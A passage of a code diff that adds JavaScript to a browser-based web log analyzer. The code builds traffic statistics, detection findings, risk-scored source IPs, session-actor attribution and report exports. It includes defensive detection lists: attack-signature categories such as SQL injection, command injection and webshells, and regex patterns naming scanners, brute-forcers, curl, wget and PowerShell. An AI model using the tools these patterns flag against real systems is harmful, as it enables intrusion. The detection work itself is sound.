+    this.view = out.subarray(0, k);
+    this.sortView();
+    this.aggregate();
+    this.renderKpis();
+    this.renderCharts();
+    this.renderTable(true);
+    document.getElementById("viewCount").textContent =
+      fmtInt(k) + " of " + fmtInt(n) + " events" + (k === n ? "" : " · filtered");
+    document.getElementById("emptyMsg").classList.toggle("hidden", k > 0);
+  },
+
+  sortView(){
+    const S = Store, key = this.sortKey, dir = this.sortDir;
+    const col = key === "ts" ? S.ts : key === "status" ? S.status : key === "bytes" ? S.bytes :
+                key === "method" ? S.method : key === "flags" ? S.flags : null;
+    if (col){ this.view.sort((a, b) => (col[a] - col[b]) * dir || a - b); return; }
+    const dict = D[key];
+    if (!dict) return;
+    const lo = lowerOf(dict), c = S[key];
+    this.view.sort((a, b) => { const x = lo[c[a]], y = lo[c[b]]; return (x < y ? -1 : x > y ? 1 : 0) * dir || a - b; });
+  },
+
+  /* --------------------------------------------------- view aggregates --- */
+  aggregate(){
+    const S = Store, v = this.view, n = v.length;
+    const ipSeen = new Uint8Array(D.ip.arr.length);
+    const urlCount = new Float64Array(D.url.arr.length);
+    const ipCount = new Float64Array(D.ip.arr.length);
+    const err5ByUrl = new Float64Array(D.url.arr.length);
+    const byteByIp = new Float64Array(D.ip.arr.length);
+    const methodCount = new Float64Array(METHODS.length);
+    const statusCount = new Float64Array(6);
+    const heat = Array.from({ length:7 }, () => new Float64Array(24));
+    const sizeBins = new Float64Array(7);
+    let bytes = 0, uniqueIps = 0, threats = 0, e4 = 0, e5 = 0, minTs = Infinity, maxTs = 0;
+
+    for (let i = 0; i < n; i++){
+      const r = v[i], ip = S.ip[r], url = S.url[r], st = S.status[r], by = S.bytes[r], ts = S.ts[r];
+      if (!ipSeen[ip]){ ipSeen[ip] = 1; uniqueIps++; }
+      urlCount[url]++; ipCount[ip]++; byteByIp[ip] += by;
+      bytes += by;
+      methodCount[S.method[r]]++;
+      const cls = st >= 100 ? Math.min(5, Math.floor(st / 100)) : 0;   // 0 = no status parsed
+      statusCount[cls]++;
+      if (st >= 500){ e5++; err5ByUrl[url]++; } else if (st >= 400) e4++;
+      if (S.flags[r] & ~NOISE_MASK) threats++;
+      if (ts){
+        if (ts < minTs) minTs = ts;
+        if (ts > maxTs) maxTs = ts;
+        const d = new Date(ts);
+        heat[d.getUTCDay()][d.getUTCHours()]++;
+      }
+      const b = by <= 0 ? 0 : by < 1024 ? 1 : by < 10240 ? 2 : by < 102400 ? 3 : by < 1048576 ? 4 : by < 10485760 ? 5 : 6;
+      sizeBins[b]++;
+    }
+    this.agg = { n, bytes, uniqueIps, threats, e4, e5,
+      minTs:minTs === Infinity ? 0 : minTs, maxTs,
+      urlCount, ipCount, err5ByUrl, byteByIp, methodCount, statusCount, heat, sizeBins };
+  },
+
+  topN(counts, k, dict){
+    const idx = [];
+    for (let i = 0; i < counts.length; i++) if (counts[i] > 0) idx.push(i);
+    idx.sort((a, b) => counts[b] - counts[a]);
+    return idx.slice(0, k).map(i => ({ id:i, label:dict.arr[i], value:counts[i] }));
+  },
+
+  /* ---------------------------------------------------------------- KPIs - */
+  renderKpis(){
+    const a = this.agg, S = Store;
+    const span = a.maxTs - a.minTs;
+    const peak = span > 0 ? a.n / Math.max(1, span / 1000) : 0;
+    const top = this.topN(a.urlCount, 1, D.url)[0];
+    const cards = [
+      { k:"Events in view", v:fmtInt(a.n), d:fmtInt(Store.n) + " parsed total", c:"var(--azure)" },
+      { k:"Unique sources", v:fmtInt(a.uniqueIps), d:fmtInt(D.ip.arr.length) + " seen overall", c:"var(--violet)" },
+      { k:"Detections", v:fmtInt(a.threats), d:(a.n ? (100 * a.threats / a.n).toFixed(2) : "0") + "% of view", c:"var(--coral)" },
+      { k:"Client errors", v:fmtInt(a.e4), d:"4xx responses", c:"var(--amber)" },
+      { k:"Server errors", v:fmtInt(a.e5), d:"5xx responses", c:"var(--coral)" },
+      { k:"Transferred", v:fmtBytes(a.bytes), d:"avg " + fmtBytes(a.n ? a.bytes / a.n : 0) + "/req", c:"var(--mint)" },
+      { k:"Capture span", v:fmtDur(span),
+        d:(a.minTs ? fmtTime(a.minTs) : "no timestamps") + " · " + (peak < 10 ? peak.toFixed(2) : fmtInt(peak)) + "/s",
+        c:"var(--slate)" },
+      { k:"Busiest endpoint", v:top ? fmtInt(top.value) : "0", d:top ? top.label.slice(0, 34) : "—", c:"var(--violet)" },
+      { k:"Unparsed lines", v:fmtInt(Files.list.reduce((s, f) => s + (f.skipped || 0), 0)), d:"kept as samples", c:"var(--slate)" }
+    ];
+    document.getElementById("kpis").innerHTML = cards.map(c =>
+      '<div class="kpi" style="--accent:' + c.c + '"><div class="k">' + esc(c.k) + '</div><div class="v">' + esc(c.v) +
+      '</div><div class="d">' + esc(c.d) + "</div></div>").join("");
+  },
+
+  /* ------------------------------------------------------------- charts -- */
+  renderCharts(){
+    const a = this.agg;
+    donut(document.getElementById("cStatus"), [
+      { label:"2xx", value:a.statusCount[2], color:CLR.s2, click:() => this.toggleStatusFacet(2) },
+      { label:"3xx", value:a.statusCount[3], color:CLR.s3, click:() => this.toggleStatusFacet(3) },
+      { label:"4xx", value:a.statusCount[4], color:CLR.s4, click:() => this.toggleStatusFacet(4) },
+      { label:"5xx", value:a.statusCount[5], color:CLR.s5, click:() => this.toggleStatusFacet(5) },
+      { label:"1xx / none", value:a.statusCount[0] + a.statusCount[1], color:CLR.s0, click:() => this.toggleStatusFacet(0) }
+    ].filter(x => x.value > 0), "in view");
+
+    donut(document.getElementById("cMethod"),
+      METHODS.map((m, i) => ({ label:m, value:a.methodCount[i], color:[CLR.s2,CLR.azure,CLR.s4,CLR.s5,CLR.s3,CLR.s0,"#f472b6","#fb923c","#22d3ee","#facc15",CLR.s0][i] }))
+        .filter(x => x.value > 0).sort((x, y) => y.value - x.value), "requests");
+
+    hbar(document.getElementById("cEndpoints"),
+      this.topN(a.urlCount, 8, D.url).map(t => ({
+        label:t.label, value:t.value, color:CLR.azure, tip:t.label,
+        click:() => this.setQuery('url = "' + t.label.replace(/"/g, '\\"') + '"')
+      })), { labelW:230 });
+
+    const ipStats = Analytics.ipStats;
+    hbar(document.getElementById("cTalkers"),
+      this.topN(a.ipCount, 8, D.ip).map(t => {
+        const s = ipStats && ipStats.get(t.id);
+        const score = s ? s.score : 0;
+        return {
+          label:t.label, value:t.value,
+          color:score >= 60 ? CLR.s5 : score >= 30 ? CLR.s4 : CLR.s2,
+          tip:t.label + (s ? "\nrisk " + score + "/100 · " + fmtBytes(s.bytes) : ""),
+          click:() => this.setQuery("ip = " + t.label)
+        };
+      }), { labelW:150 });
+
+    heatmap(document.getElementById("cHeat"), a.heat);
+
+    histogram(document.getElementById("cBytes"), Array.from(a.sizeBins),
+      ["0", "<1KB", "1–10KB", "10–100KB", "0.1–1MB", "1–10MB", ">10MB"]);
+
+    hbar(document.getElementById("cErrors"),
+      this.topN(a.err5ByUrl, 7, D.url).map(t => ({
+        label:t.label, value:t.value, color:CLR.s5,
+        click:() => this.setQuery('status >= 500 AND url = "' + t.label.replace(/"/g, '\\"') + '"')
+      })), { labelW:230 });
+
+    Strip.draw();
+  },
+
+  /* ----------------------------------------------------------- findings -- */
+  renderFindings(){
+    const rows = [];
+    for (let b = 0; b < 32; b++){
+      const count = Analytics.ruleCount[b];
+      if (!count) continue;
+      const rule = RULE_BY_BIT[b];
+      if (!rule) continue;
+      rows.push({ rule, count, sources:Analytics.ruleSources[b].size, sample:Analytics.ruleSample[b] });
+    }
+    rows.sort((x, y) => SEV_ORDER[x.rule.sev] - SEV_ORDER[y.rule.sev] || y.count - x.count);
+    const spikes = Analytics.spikes || [];
+    document.getElementById("findCount").textContent =
+      rows.length + " rules fired" + (spikes.length ? " · " + spikes.length + " anomaly window" + (spikes.length === 1 ? "" : "s") : "");
+    const S = Store;
+
+    const spikeHtml = spikes.map((s, i) =>
+      '<div class="finding" data-spike="' + i + '" style="--sev:var(--violet)">' +
+      '<div class="sevbar"></div><div>' +
+      '<h4>Server-error spike<span class="sevtag" style="color:var(--violet)">anomaly</span></h4>' +
+      '<div class="why">' + fmtInt(s.count) + " server errors in " + fmtDur(s.to - s.from) +
+      (s.baseline > 0 ? " — baseline " + fmtInt(s.baseline) + " per " + fmtDur(s.bucket)
+                      : " — a typical " + fmtDur(s.bucket) + " window has none") +
+      " · click to scope the window</div>" +
+      '<div class="sample">' + fmtTime(s.from) + "  →  " + fmtTime(s.to) + "</div></div>" +
+      '<div class="n">' + (s.total ? Math.round(100 * s.count / s.total) : 0) + "%<small>of window</small></div></div>").join("");
+
+    document.getElementById("findings").innerHTML = spikeHtml + (rows.length ? rows.map(f => {
+      const sampleRow = f.sample;
+      const sample = sampleRow >= 0
+        ? (D.ip.arr[S.ip[sampleRow]] + "  " + METHODS[S.method[sampleRow]] + " " + D.url.arr[S.url[sampleRow]]).slice(0, 160)
+        : "";
+      return '<div class="finding" data-rule="' + f.rule.id + '" style="--sev:' + SEV_COLOR[f.rule.sev] + '">' +
+        '<div class="sevbar"></div><div>' +
+        "<h4>" + esc(f.rule.label) +
+        '<span class="sevtag" style="color:' + SEV_COLOR[f.rule.sev] + '">' + f.rule.sev + "</span>" +
+        (f.rule.behavioural ? '<span class="sevtag" style="color:var(--violet)">behavioural</span>' : "") +
+        "</h4>" +
+        '<div class="why">' + esc(f.rule.why) + " · " + fmtInt(f.sources) + " source" + (f.sources === 1 ? "" : "s") + "</div>" +
+        (sample ? '<div class="sample">' + esc(sample) + "</div>" : "") +
+        "</div>" +
+        '<div class="n">' + fmtInt(f.count) + "<small>" + (f.rule.behavioural ? "attributed" : "events") + "</small></div></div>";
+    }).join("") : (spikeHtml ? "" : '<div class="empty">No detections fired on this capture.</div>'));
+
+    document.querySelectorAll("#findings [data-rule]").forEach(el => {
+      el.addEventListener("click", () => this.setQuery("flag:" + el.dataset.rule));
+    });
+    document.querySelectorAll("#findings [data-spike]").forEach(el => {
+      el.addEventListener("click", () => {
+        const s = spikes[+el.dataset.spike];
+        Strip.brush = { from:s.from, to:s.to };
+        this.setQuery("status >= 500");
+        Strip.draw();
+      });
+    });
+  },
+
+  /* ------------------------------------------------------------- actors -- */
+  renderActors(){
+    const list = Analytics.actors;
+    document.getElementById("actorCount").textContent = fmtInt(list.length) + " scored";
+    if (!list.length){ document.getElementById("actors").innerHTML = '<div class="empty">No source scored above zero.</div>'; return; }
+    document.getElementById("actors").innerHTML = list.slice(0, 40).map(s => {
+      const ip = D.ip.arr[s.ip];
+      const color = s.score >= 70 ? "var(--sev-critical)" : s.score >= 40 ? "var(--sev-high)" : "var(--sev-medium)";
+      const tags = []
+        .concat(s.reasons.map(r => '<span class="tag hot">' + esc(RULE_BY_ID[r.id].label) + ": " + esc(r.detail) + "</span>"))
+        .concat((s.sigHits || []).filter(r => r.sev === "critical" || r.sev === "high")
+          .slice(0, 4).map(r => '<span class="tag">' + esc(r.label) + "</span>"));
+      return '<div class="actor" data-ip="' + esc(ip) + '">' +
+        '<div><div class="ip">' + esc(ip) + "</div>" +
+        '<div class="tags">' + (tags.join("") || '<span class="tag">' + fmtInt(s.n) + " requests</span>") + "</div></div>" +
+        '<div class="risk"><b style="color:' + color + '">' + s.score + "</b>" +
+        '<div class="riskbar"><i style="width:' + s.score + "%;background:" + color + '"></i></div>' +
+        '<span style="font-size:10px;color:var(--faint)">' + fmtInt(s.n) + " req · " + fmtBytes(s.bytes) + "</span></div></div>";
+    }).join("");
+    document.querySelectorAll("#actors .actor").forEach(el => {
+      el.addEventListener("click", () => this.setQuery("ip = " + el.dataset.ip));
+    });
+  },
+
+  /* -------------------------------------------------------------- table -- */
+  renderHead(){
+    document.getElementById("thead").innerHTML = COLUMNS.map(c =>
+      "<div data-key=" + c.key + ">" + c.label + (this.sortKey === c.key ? ' <span class="arrow">' + (this.sortDir > 0 ? "▲" : "▼") + "</span>" : "") + "</div>").join("");
+    document.querySelectorAll("#thead > div").forEach(el => {
+      el.addEventListener("click", () => {
+        const k = el.dataset.key;
+        if (this.sortKey === k) this.sortDir *= -1; else { this.sortKey = k; this.sortDir = k === "ts" ? 1 : -1; }
+        this.renderHead();
+        this.sortView();
+        this.renderTable(true);
+      });
+    });
+  },
+
+  renderTable(reset){
+    const vp = document.getElementById("vp");
+    if (reset){ vp.scrollTop = 0; this.lastStart = -1; }
+    document.getElementById("spacer").style.height = (this.view.length * this.rowH) + "px";
+    this.paint();
+  },
+
+  paint(){
+    const vp = document.getElementById("vp"), rowsEl = document.getElementById("rows");
+    const total = this.view.length;
+    const per = Math.ceil(vp.clientHeight / this.rowH) + 8;
+    let start = Math.max(0, Math.floor(vp.scrollTop / this.rowH) - 4);
+    if (start + per > total) start = Math.max(0, total - per);
+    if (start === this.lastStart && rowsEl.childElementCount) { return; }
+    this.lastStart = start;
+    const S = Store, end = Math.min(total, start + per);
+    const parts = [];
+    for (let i = start; i < end; i++){
+      const r = this.view[i];
+      const st = S.status[r], fl = S.flags[r];
+      const dots = [];
+      if (fl){
+        for (let b = 0; b < 32; b++) if (fl & (1 << b)){
+          const rule = RULE_BY_BIT[b];
+          if (rule) dots.push('<i style="background:' + SEV_COLOR[rule.sev] + '" title="' + esc(rule.label) + '"></i>');
+          if (dots.length >= 8) break;
+        }
+      }
+      parts.push('<div class="trow' + (r === this.selected ? " sel" : "") + '" data-row="' + r + '">' +
+        "<div>" + fmtTime(S.ts[r]) + "</div>" +
+        "<div>" + esc(D.ip.arr[S.ip[r]]) + "</div>" +
+        "<div>" + METHODS[S.method[r]] + "</div>" +
+        "<div>" + esc(D.url.arr[S.url[r]]) + "</div>" +
+        '<div class="' + statusClass(st) + '">' + (st || "—") + "</div>" +
+        "<div>" + (S.bytes[r] ? fmtBytes(S.bytes[r]) : "—") + "</div>" +
+        "<div>" + esc(D.ua.arr[S.ua[r]]) + "</div>" +
+        '<div class="flagdots">' + dots.join("") + "</div>" +
+        "</div>");
+    }
+    rowsEl.style.transform = "translateY(" + (start * this.rowH) + "px)";
+    rowsEl.innerHTML = parts.join("");
+  },
+
+  /* ------------------------------------------------------------- drawer -- */
+  openRow(r){
+    this.selected = r;
+    const S = Store, ip = D.ip.arr[S.ip[r]], url = D.url.arr[S.url[r]];
+    const hits = [];
+    for (let b = 0; b < 32; b++) if (S.flags[r] & (1 << b)){ const rule = RULE_BY_BIT[b]; if (rule) hits.push(rule); }
+    const prof = Analytics.ipStats && Analytics.ipStats.get(S.ip[r]);
+    const raw = S.raw.get(r);
+    const body = document.getElementById("drawerBody");
+
+    body.innerHTML =
+      '<dl class="kv">' +
+        "<dt>Time</dt><dd>" + fmtTime(S.ts[r]) + (S.ts[r] ? " UTC" : "") + "</dd>" +
+        "<dt>Source</dt><dd>" + esc(ip) + "</dd>" +
+        "<dt>Request</dt><dd>" + METHODS[S.method[r]] + " " + esc(url) + "</dd>" +
+        "<dt>Status</dt><dd class='" + statusClass(S.status[r]) + "'>" + (S.status[r] || "—") + "</dd>" +
+        "<dt>Bytes</dt><dd>" + fmtBytes(S.bytes[r]) + "</dd>" +
+        "<dt>Client</dt><dd>" + esc(D.ua.arr[S.ua[r]]) + "</dd>" +
+        "<dt>Referrer</dt><dd>" + esc(D.ref.arr[S.ref[r]]) + "</dd>" +
+        "<dt>File</dt><dd>" + esc(Files.list[S.file[r]] ? Files.list[S.file[r]].name : "—") + "</dd>" +
+      "</dl>" +
+      (hits.length ?
+        '<div><p class="eyebrow" style="margin-bottom:8px">Detections on this event</p>' +
+        hits.map(h => '<div class="finding" style="--sev:' + SEV_COLOR[h.sev] + ';cursor:default"><div class="sevbar"></div>' +
+          "<div><h4>" + esc(h.label) + '<span class="sevtag" style="color:' + SEV_COLOR[h.sev] + '">' + h.sev + '</span></h4>' +
+          '<div class="why">' + esc(h.why) + "</div></div><div></div></div>").join("") + "</div>"
+        : '<p style="color:var(--faint);font-size:12.5px">No detection fired on this event.</p>') +
+      (prof ?
+        '<div><p class="eyebrow" style="margin-bottom:8px">Source profile — ' + esc(ip) + "</p>" +
+        '<dl class="kv">' +
+          "<dt>Requests</dt><dd>" + fmtInt(prof.n) + "</dd>" +
+          "<dt>Risk</dt><dd>" + prof.score + " / 100</dd>" +
+          "<dt>4xx / 5xx</dt><dd>" + fmtInt(prof.e4) + " / " + fmtInt(prof.e5) + "</dd>" +
+          "<dt>Transferred</dt><dd>" + fmtBytes(prof.bytes) + "</dd>" +
+          "<dt>Active</dt><dd>" + fmtTime(prof.first) + " → " + fmtTime(prof.last) + "</dd>" +
+          "<dt>Peak rate</dt><dd>" + fmtInt(prof.mMax) + " req/min</dd>" +
+          "<dt>404 paths</dt><dd>" + fmtInt(prof.nf.size) + "</dd>" +
+        "</dl></div>" : "") +
+      (raw ? '<div><p class="eyebrow" style="margin-bottom:8px">Raw line</p><pre class="raw">' + esc(raw) + "</pre></div>"
+           : '<p style="color:var(--faint);font-size:12px">Raw line retained only for flagged events.</p>') +
+      '<div class="drawer-actions">' +
+        '<button class="btn" data-act="ip">Filter to this source</button>' +
+        '<button class="btn" data-act="url">Filter to this request</button>' +
+        '<button class="btn ghost" data-act="copy">Copy event</button>' +
+      "</div>";
+
+    body.querySelector('[data-act=ip]').onclick = () => { this.setQuery("ip = " + ip); this.closeDrawer(); };
+    body.querySelector('[data-act=url]').onclick = () => { this.setQuery('url = "' + url.replace(/"/g, '\\"') + '"'); this.closeDrawer(); };
+    body.querySelector('[data-act=copy]').onclick = () => {
+      const text = raw || [fmtTime(S.ts[r]), ip, METHODS[S.method[r]], url, S.status[r], S.bytes[r], D.ua.arr[S.ua[r]]].join(" ");
+      navigator.clipboard.writeText(text).then(() => toast("Event copied"), () => toast("Clipboard blocked by the browser", true));
+    };
+    document.getElementById("drawer").classList.add("open");
+    document.getElementById("drawer").setAttribute("aria-hidden", "false");
+    this.paint();
+  },
+  closeDrawer(){
+    document.getElementById("drawer").classList.remove("open");
+    document.getElementById("drawer").setAttribute("aria-hidden", "true");
+  },
+
+  /* ------------------------------------------------------------ helpers -- */
+  setQuery(q){
+    document.getElementById("q").value = q;
+    this.applyFilters();
+    document.getElementById("explorer").scrollIntoView({ behavior:"smooth", block:"start" });
+  },
+  toggleStatusFacet(cls){
+    if (this.facetStatus.has(cls)) this.facetStatus.delete(cls); else this.facetStatus.add(cls);
+    this.renderFacets();
+    this.applyFilters();
+  },
+  renderFacets(){
+    const el = document.getElementById("facets");
+    const classes = [[2,"2xx"],[3,"3xx"],[4,"4xx"],[5,"5xx"],[0,"other"]];
+    el.innerHTML =
+      '<div class="facet"><span>Status</span>' +
+        classes.map(c => '<button data-cls="' + c[0] + '" aria-pressed="' + this.facetStatus.has(c[0]) + '">' + c[1] + "</button>").join("") +
+      "</div>" +
+      '<div class="facet"><span>View</span>' +
+        '<button data-det="1" aria-pressed="' + this.detectionsOnly + '">detections only</button>' +
+      "</div>" +
+      '<div class="facet"><span>Sort</span><button data-sort="1" aria-pressed="false">' +
+        this.sortKey + " " + (this.sortDir > 0 ? "asc" : "desc") + "</button></div>";
+    el.querySelectorAll("[data-cls]").forEach(b => b.addEventListener("click", () => this.toggleStatusFacet(+b.dataset.cls)));
+    el.querySelector("[data-det]").addEventListener("click", () => {
+      this.detectionsOnly = !this.detectionsOnly; this.renderFacets(); this.applyFilters();
+    });
+    el.querySelector("[data-sort]").addEventListener("click", () => {
+      this.sortDir *= -1; this.renderHead(); this.sortView(); this.renderTable(true); this.renderFacets();
+    });
+  },
+
+  /* ------------------------------------------------------------ exports -- */
+  exportCSV(){
+    const S = Store, v = this.view, parts = ["time_utc,source,method,request,status,bytes,user_agent,referrer,detections,file\n"];
+    const q = s => '"' + String(s).replace(/"/g, '""') + '"';
+    let chunk = [];
+    for (let i = 0; i < v.length; i++){
+      const r = v[i];
+      chunk.push([fmtTime(S.ts[r]), q(D.ip.arr[S.ip[r]]), METHODS[S.method[r]], q(D.url.arr[S.url[r]]),
+        S.status[r], S.bytes[r], q(D.ua.arr[S.ua[r]]), q(D.ref.arr[S.ref[r]]),
+        q(this.flagNames(S.flags[r]).join("|")), q(Files.list[S.file[r]] ? Files.list[S.file[r]].name : "")].join(","));
+      if (chunk.length >= 5000){ parts.push(chunk.join("\n") + "\n"); chunk = []; }
+    }
+    if (chunk.length) parts.push(chunk.join("\n") + "\n");
+    download(new Blob(parts, { type:"text/csv" }), "vehcs-events-" + Date.now() + ".csv");
+  },
+  exportNDJSON(){
+    const S = Store, v = this.view, parts = [];
+    let chunk = [];
+    for (let i = 0; i < v.length; i++){
+      const r = v[i];
+      chunk.push(JSON.stringify({
+        time:S.ts[r] ? new Date(S.ts[r]).toISOString() : null,
+        source:D.ip.arr[S.ip[r]], method:METHODS[S.method[r]], request:D.url.arr[S.url[r]],
+        status:S.status[r], bytes:S.bytes[r], user_agent:D.ua.arr[S.ua[r]], referrer:D.ref.arr[S.ref[r]],
+        detections:this.flagNames(S.flags[r]), file:Files.list[S.file[r]] ? Files.list[S.file[r]].name : null
+      }));
+      if (chunk.length >= 5000){ parts.push(chunk.join("\n") + "\n"); chunk = []; }
+    }
+    if (chunk.length) parts.push(chunk.join("\n") + "\n");
+    download(new Blob(parts, { type:"application/x-ndjson" }), "vehcs-events-" + Date.now() + ".ndjson");
+  },
+  exportReport(){
+    if (!Store.n){ toast("Load a log first", true); return; }
+    const html = buildProReport();
+    download(new Blob([html], { type:"text/html" }), "vehcs-incident-report-" + Date.now() + ".html");
+    toast("Professional report generated");
+  },
+  exportData(){
+    if (!Store.n){ toast("Load a log first", true); return; }
+    const a = this.agg;
+    const findings = [];
+    for (let b = 0; b < 32; b++){
+      if (!Analytics.ruleCount[b]) continue;
+      const rule = RULE_BY_BIT[b];
+      findings.push({ id:rule.id, label:rule.label, severity:rule.sev, behavioural:!!rule.behavioural,
+        events:Analytics.ruleCount[b], sources:Analytics.ruleSources[b].size });
+    }
+    const report = {
+      generated:new Date().toISOString(),
+      tool:"VEHCS Log Analyzer",
+      files:Files.list.map(f => ({ name:f.name, bytes:f.size, format:f.format, lines:f.lines, parsed:f.parsed, unparsed:f.skipped })),
+      capture:{ from:Analytics.minTs ? new Date(Analytics.minTs).toISOString() : null,
+                to:Analytics.maxTs ? new Date(Analytics.maxTs).toISOString() : null,
+                events:Store.n, unique_sources:D.ip.arr.length, unique_endpoints:D.url.arr.length,
+                bytes_transferred:Analytics.totalBytes },
+      view:{ query:document.getElementById("q").value, window:Strip.brush, events:a ? a.n : 0 },
+      findings:findings.sort((x, y) => SEV_ORDER[x.severity] - SEV_ORDER[y.severity] || y.events - x.events),
+      threat_actors:Analytics.actors.slice(0, 25).map(s => ({
+        source:D.ip.arr[s.ip], risk:s.score, requests:s.n, bytes:s.bytes,
+        first_seen:s.first ? new Date(s.first).toISOString() : null,
+        last_seen:s.last ? new Date(s.last).toISOString() : null,
+        peak_rate_per_min:s.mMax, distinct_404_paths:s.nf.size,
+        behaviours:s.reasons.map(r => ({ id:r.id, detail:r.detail })),
+        signatures:(s.sigHits || []).map(r => r.id)
+      })),
+      unparsed_samples:Store.unparsed.slice(0, 20)
+    };
+    download(new Blob([JSON.stringify(report, null, 2)], { type:"application/json" }), "vehcs-report-" + Date.now() + ".json");
+  },
+  flagNames(fl){
+    const out = [];
+    if (!fl) return out;
+    for (let b = 0; b < 32; b++) if (fl & (1 << b)){ const r = RULE_BY_BIT[b]; if (r) out.push(r.id); }
+    return out;
+  },
+
+  reset(){
+    Files.list.length = 0;
+    Store.init(1 << 16);
+    ["ip","url","ua","ref"].forEach(k => { D[k] = makeDict(); });
+    Analytics.actors = []; Analytics.ipStats = null; Analytics.spikes = []; Analytics.minTs = Analytics.maxTs = 0;
+    Analytics.ruleCount = new Float64Array(32);
+    Analytics.ruleSources = Array.from({ length:32 }, () => new Set());
+    Ingest.queue.length = 0; Ingest.inflight = 0; Ingest.bytes = 0; Ingest.lines = 0; Ingest.running = false;
+    Strip.brush = null; Strip.buckets = null;
+    this.view = new Uint32Array(0); this.selected = -1;
+    this.facetStatus.clear(); this.detectionsOnly = false;
+    document.getElementById("queue").innerHTML = "";
+    document.getElementById("q").value = "";
+    ["stripPanel","kpis","analysis","charts","explorer"].forEach(id => document.getElementById(id).classList.add("hidden"));
+    document.getElementById("intake").classList.remove("compact");
+    this.liveStats();
+    this.closeDrawer();
+    toast("Workspace cleared");
+  }
+};
+
+
+/* ===========================================================================
+   IP-INDEPENDENT SESSION-ACTOR ATTRIBUTION
+   For captures where a load balancer is the only visible source and the real
+   client IP never appears, per-IP scoring cannot separate attackers. Actors
+   are reconstructed from signals that survive IP collapse: user-agent / tool
+   identity and 30-minute session windows, scored by the attacks they carried.
+   =========================================================================== */
+const ATTACK_MASK = (function () {
+  let m = 0;
+  // content signatures only — these are set per-row and are accurate even when
+  // every request shares one load-balancer IP. Behavioural bits (brute_force,
+  // dir_scan, beaconing…) are stamped per-IP and would smear across an actor's
+  // benign traffic when IPs collapse, so they are intentionally excluded here.
+  ["sqli","xss","traversal","cmdi","lfi_rfi","log4shell","ssti","webshell",
+   "sensitive_path","ssrf","open_redirect","crlf","nullbyte","double_encoded",
+   "scanner_ua","shellshock"].forEach(id => { if (id in BITS) m |= (1 << BITS[id]); });
+  return m;
+})();
+const TOOL_SIGS = [
+  [/sqlmap/i,"sqlmap"],[/nikto/i,"nikto"],[/nmap/i,"nmap"],[/masscan|zmap|zgrab/i,"mass-scanner"],
+  [/nuclei/i,"nuclei"],[/wpscan/i,"wpscan"],[/gobuster|dirbuster|feroxbuster|ffuf|dirb|dirsearch/i,"content-scanner"],
+  [/acunetix|nessus|qualys|openvas|netsparker|arachni|w3af/i,"vuln-scanner"],
+  [/hydra|medusa|patator/i,"brute-forcer"],[/burp|zap\b|zaproxy/i,"proxy-scanner"],
+  [/commix/i,"commix"],[/xsstrike/i,"xsstrike"],[/curl/i,"curl"],[/wget/i,"wget"],
+  [/python-requests|python-urllib|python\//i,"python-script"],
+  [/go-http|okhttp|java\/|libwww|perl|ruby|winhttp|powershell|scrapy|axios|node-fetch/i,"http-library"]
+];
+function toolOf(ua){ for (const [re,name] of TOOL_SIGS) if (re.test(ua||"")) return name; return null; }
+
+function computeSessionActors(){
+  const S = Store, n = S.n, GAP = 30*60000;
+  const groups = new Map();                       // uaId -> [rowIdx...] with an attack flag
+  for (let r = 0; r < n; r++){
+    if (!(S.flags[r] & ATTACK_MASK)) continue;
+    const k = S.ua[r];
+    let g = groups.get(k); if (!g){ g = []; groups.set(k, g); }
+    g.push(r);
+  }
+  const actors = [];
+  const SEVW = { critical:5, high:3, medium:1.5, low:0.5 };
+  const ipPub = ip => ip && !/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.|::1|fc|fd|fe80)/i.test(ip);
+  const pubIps = new Set(), allIps = new Set();
+
+  groups.forEach((rows, uaId) => {
+    rows.sort((a,b) => (S.ts[a]||0) - (S.ts[b]||0));
+    let sess = null;
+    const flush = () => {
+      if (!sess || !sess.rows.length) return;
+      const cats = {}, ips = new Set(), mitres = new Set(); let worst = "low", score = 0;
+      const order = ["low","medium","high","critical"];
+      for (const r of sess.rows){
+        const fl = S.flags[r];
+        for (let b = 0; b < 32; b++){
+          if (fl & (1 << b) & ATTACK_MASK){
+            const rule = RULE_BY_BIT[b]; if (!rule) continue;
+            cats[rule.id] = (cats[rule.id]||0) + 1;
+            score += SEVW[rule.sev] || 0.5;
+            if (order.indexOf(rule.sev) > order.indexOf(worst)) worst = rule.sev;
+            const mt = MITRE_MAP[rule.id]; if (mt) mitres.add(mt.id + " " + mt.name);
+          }
+        }
+        const ipStr = D.ip.arr[S.ip[r]]; if (ipStr){ ips.add(ipStr); allIps.add(ipStr); if (ipPub(ipStr)) pubIps.add(ipStr); }
+      }
+      const catList = Object.entries(cats).sort((a,b)=>b[1]-a[1]);
+      score += (catList.length - 1) * 3;
+      const span = sess.last - sess.first;
+      const rate = span > 0 ? sess.rows.length / (span/60000) : sess.rows.length;
+      const ua = D.ua.arr[uaId] || "-";
+      const tool = toolOf(ua);
+      let conf = 20 + Math.min(30, sess.rows.length) + (catList.length-1)*7 + (tool?12:0)
+               + (worst==="critical"?16:worst==="high"?8:0);
+      conf = Math.max(5, Math.min(100, Math.round(conf)));
+      actors.push({
+        ua, tool, ips:[...ips], events:sess.rows.length,
+        categories:catList.map(([id,nn])=>({ id, label:(RULE_BY_ID[id]||{}).label||id, n:nn })),
+        mitre:[...mitres], worst, score:Math.round(score), confidence:conf,
+        first:sess.first, last:sess.last, durationMs:span, reqPerMin:+rate.toFixed(2)
+      });
+      sess = null;
+    };
+    for (const r of rows){
+      const t = S.ts[r] || 0;
+      if (!sess) sess = { rows:[], first:t, last:t };
+      else if (t - sess.last > GAP){ flush(); sess = { rows:[], first:t, last:t }; }
+      sess.rows.push(r); sess.last = t; if (!sess.first) sess.first = t;
+    }
+    flush();
+  });
+  actors.sort((a,b)=>b.score-a.score);
+  actors.forEach((a,i)=>a.id = "SA-" + (i+1));
+  return { actors, total:actors.length, publicIpCount:pubIps.size, distinctIpCount:allIps.size,
+           proxyBlind: pubIps.size === 0 && actors.length > 0,
+           collapsed: pubIps.size <= 2 && actors.length > pubIps.size };
+}
+
+/* ===========================================================================
+   PROFESSIONAL INCIDENT REPORT  (standalone, self-contained, print → PDF)
+   =========================================================================== */
+/* ===========================================================================
+   ADVANCED INTELLIGENCE LAYER  (main-thread, reads the columnar Store)
+   Three engines the fast per-row worker cannot do on its own:
+     1. decoding-aware extended payload detection (new attack classes, caught
+        even through URL / double-URL / unicode / base64 obfuscation),
+     2. DoS / DDoS detection (volumetric + application-layer, statistical),
+     3. correlation — fusing signatures, behaviour, actors and DoS windows into
+        named INCIDENTS with a written rationale and a MITRE kill-chain.
+   All of this is computed at report time so the live UI stays fast.
